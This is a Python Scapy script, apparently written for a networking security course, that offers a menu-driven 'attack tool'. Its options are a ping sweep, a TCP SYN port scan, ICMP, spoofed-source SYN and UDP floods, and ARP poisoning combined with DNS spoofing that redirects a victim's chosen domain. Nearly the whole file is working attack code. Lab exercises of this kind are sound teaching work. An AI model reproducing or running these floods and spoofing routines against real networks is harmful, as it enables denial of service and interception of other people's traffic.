from scapy.all import IP, ICMP, TCP, UDP, ARP, Ether, send, sr1, RandShort, srp, sniff, DNS, DNSRR
import ipaddress
import logging
import random
import sys
import signal
import time
import threading
import os

def signal_handler(sig, frame):
    print("\n[!] Operation interrupted by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Reconnaissance
# Ping Sweep
def ping_sweep(network_range):
    print(f"Starting Ping Sweep for range: {network_range}")
    try:
        for host in ipaddress.IPv4Network(network_range, strict=False):
            packet = IP(dst=str(host)) / ICMP()
            response = sr1(packet, timeout=1, verbose=0)

            if response and response.haslayer(ICMP):
                print(f"[+] Host {host} is active.")
    except Exception as e:
        print(f"[!] Error: {e}")
    print("[INFO] Ping Sweep completed!")

# TCP SYN Portscanner
def tcp_syn_scan(target, start_port, end_port):
    print(f"Scanning {target} for open TCP ports in range ({start_port} - {end_port}).")
    try:
        for port in range(start_port, end_port + 1):
            packet = IP(dst=target) / TCP(dport=port, flags='S')
            response = sr1(packet, timeout=1, verbose=0)

            if response:
                if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
                    print(f"[+] Port {port} is OPEN!")
                    send(IP(dst=target) / TCP(dport=port, flags='R'), verbose=0)
                elif response.haslayer(TCP) and response.getlayer(TCP).flags == 0x14:
                    print(f"[-] Port {port} is CLOSED.")
            else:
                print(f"[?] Port {port} filtered or no response.")
    except Exception as e:
        print(f"[!] Error: {e}")
    print("[INFO] Port Scan completed!")

# DoS Attacks
# ICMP Flood
def icmp_flood(target_ip, interval, packet_count):
    print(f"Starting ICMP Flood on {target_ip} with interval {interval} seconds...")
    try:
        packet = IP(dst=target_ip) / ICMP()
        if packet_count == 0:
            print("[+] Sending packets in a loop. Use Ctrl+C to stop.")
            send(packet, loop=1, inter=interval, verbose=0)
        else:
            print(f"[+] Sending {packet_count} packets.")
            send(packet, count=packet_count, inter=interval, verbose=0)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("[INFO] ICMP Flood completed!")

# TCP SYN Flood
def random_ip():
    return f"192.168.10.{random.randint(66, 126)}"

def tcp_syn_flood(target_ip, target_port, interval, packet_count):
    print(f"Starting TCP SYN Flood with spoofed IPs on {target_ip}:{target_port} with interval {interval} seconds...")
    try:
        if packet_count == 0:
            print("[+] Sending packets in a loop. Use Ctrl+C to stop.")
            while True:
                packet = IP(dst=target_ip, src=random_ip()) / TCP(sport=RandShort(), dport=target_port, flags='S')
                send(packet, verbose=0)
                time.sleep(interval)
        else:
            print(f"[+] Sending {packet_count} packets.")
            for _ in range(packet_count):
                packet = IP(dst=target_ip, src=random_ip()) / TCP(sport=RandShort(), dport=target_port, flags='S')
                send(packet, verbose=0)
                time.sleep(interval)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("[INFO] TCP SYN Flood completed!")

# UDP Flood
def udp_flood(target_ip, target_port, interval, packet_count):
    print(f"Starting UDP Flood on {target_ip}:{target_port} with interval {interval} seconds...")
    try:
        payload = b"A" * 1472  # 1472 bytes to fit within a single MTU-sized frame
        packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / payload
        if packet_count == 0:
            print("[+] Sending packets in a loop. Use Ctrl+C to stop.")
            send(packet, loop=1, inter=interval, verbose=0)
        else:
            print(f"[+] Sending {packet_count} packets.")
            send(packet, count=packet_count, inter=interval, verbose=0)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("[INFO] UDP Flood completed!")

# ARP & DNS Spoofing
def get_mac(ip, interface):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered, _ = srp(arp_request_broadcast, iface=interface, timeout=2, verbose=0)
        for _, received in answered:
            return received.hwsrc
        return None
    except Exception as e:
        print(f"Error retrieving MAC address: {e}")
        sys.exit(1)

def arp_spoof(target_ip, host_ip, interface):
    target_mac = get_mac(target_ip, interface)
    host_mac = get_mac(host_ip, interface)

    if not target_mac or not host_mac:
        print("Error: MAC addresses could not be found.")
        sys.exit(1)

    print(f"Starting ARP spoofing on {target_ip}, claiming to be {host_ip}, using interface {interface}...")
    try:
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip), iface=interface, verbose=0)
            send(ARP(op=2, pdst=host_ip, hwdst=host_mac, psrc=target_ip), iface=interface, verbose=0)
            time.sleep(0.1)
    except Exception as e:
        print(f"[!] Error: {e}")

def dns_spoof(packet, target_domain, spoofed_ip):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        query_name = packet[DNS].qd.qname.decode()

        if query_name == target_domain + ".":
            spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                               UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                               DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                   an=DNSRR(rrname=query_name, ttl=86400, rdata=spoofed_ip))

            send(spoofed_response, verbose=0)
            print(f"[+] DNS query for {query_name} redirected to {spoofed_ip}")

def arp_and_dns_spoof(victim_ip, gateway_ip, interface, target_domain, spoofed_ip):
    print("[INFO] Starting ARP spoofing...")
    print("[INFO] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        # Start ARP spoofing in a separate thread
        arp_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, interface), daemon=True)
        arp_thread.start()

        print("[INFO] Starting DNS spoofing...")
        sniff(filter="udp port 53", prn=lambda packet: dns_spoof(packet, target_domain, spoofed_ip), iface=interface)

    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    try:
        print("\n" + "=" * 50)
        print("          Attack Tool for SNM course   ")
        print("               by Jonas Wittmann       ")
        print("=" * 50 + "\n")
        print("[1] Ping Sweep")
        print("[2] TCP SYN Port Scan")
        print("[3] ICMP Flood")
        print("[4] TCP SYN Flood")
        print("[5] UDP Flood")
        print("[6] ARP & DNS Spoofing")
        print("\n" + "=" * 50)
        choice = input("Choose an option (1, 2, 3, 4, 5, or 6): ")
        print("=" * 50 + "\n")

        if choice == '1':
            network = input("Enter the network range (e.g., 192.168.10.0/24): ")
            ping_sweep(network)
        elif choice == '2':
            target = input("Enter the target IP address: ")
            start_port = int(input("Enter the start port (e.g., 20): "))
            end_port = int(input("Enter the end port (e.g., 100): "))
            tcp_syn_scan(target, start_port, end_port)
        elif choice == '3':
            target = input("Enter the target IP address: ")
            interval = float(input("Enter the interval between packets (e.g., 0.05): "))
            packet_count = int(input("Enter the number of packets to send (0 for loop): "))
            icmp_flood(target, interval, packet_count)
        elif choice == '4':
            target = input("Enter the target IP address: ")
            port = int(input("Enter the target port (e.g., 80): "))
            interval = float(input("Enter the interval between packets (e.g., 0.05): "))
            packet_count = int(input("Enter the number of packets to send (0 for loop): "))
            tcp_syn_flood(target, port, interval, packet_count)
        elif choice == '5':
            target = input("Enter the target IP address: ")
            port = int(input("Enter the target UDP port (e.g., 53): "))
            interval = float(input("Enter the interval between packets (e.g., 0.05): "))
            packet_count = int(input("Enter the number of packets to send (0 for loop): "))
            udp_flood(target, port, interval, packet_count)
        elif choice == '6':
            victim_ip = input("Enter the victim IP address: ")
            gateway_ip = input("Enter the gateway IP address: ")
            interface = input("Enter the network interface (e.g., eth0): ")
            target_domain = input("Enter the domain to spoof (e.g., whatever.com): ")
            spoofed_ip = input("Enter the IP address to redirect the domain to (e.g., 192.168.10.67): ")
            arp_and_dns_spoof(victim_ip, gateway_ip, interface, target_domain, spoofed_ip)
        else:
            print("[!] Invalid choice. Exiting...")
    except ValueError:
        print("[!] Invalid input. Please enter valid values.")

if __name__ == "__main__":
    main()